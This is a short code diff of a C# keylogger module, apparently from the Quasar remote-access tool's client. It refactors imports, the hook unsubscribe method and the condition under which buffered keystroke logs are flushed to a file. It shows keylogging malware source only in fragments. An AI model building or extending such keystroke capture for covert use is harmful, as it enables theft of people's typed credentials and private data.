@@ -4,9 +4,9 @@ using System.Diagnostics;
 using System.IO;
 using System.Text;
 using System.Windows.Forms;
-using xClient.Core.Data;
 using xClient.Core.Helper;
 using xClient.Core.MouseKeyHook;
+using xClient.Core.Networking;
 using Timer = System.Timers.Timer;
 
 namespace xClient.Core.Utilities
@@ -99,7 +99,6 @@ namespace xClient.Core.Utilities
         private void Unsubscribe()
         {
             if (_mEvents == null) return;
-
             _mEvents.KeyDown -= OnKeyDown;
             _mEvents.KeyUp -= OnKeyUp;
             _mEvents.KeyPress -= OnKeyPress;
@@ -237,7 +236,7 @@ namespace xClient.Core.Utilities
 
         private void timerFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
         {
-            if (_logFileBuffer.Length > 0 && !ClientData.Disconnect)
+            if (_logFileBuffer.Length > 0 && !QuasarClient.Exiting)
                 WriteFile();
         }
 
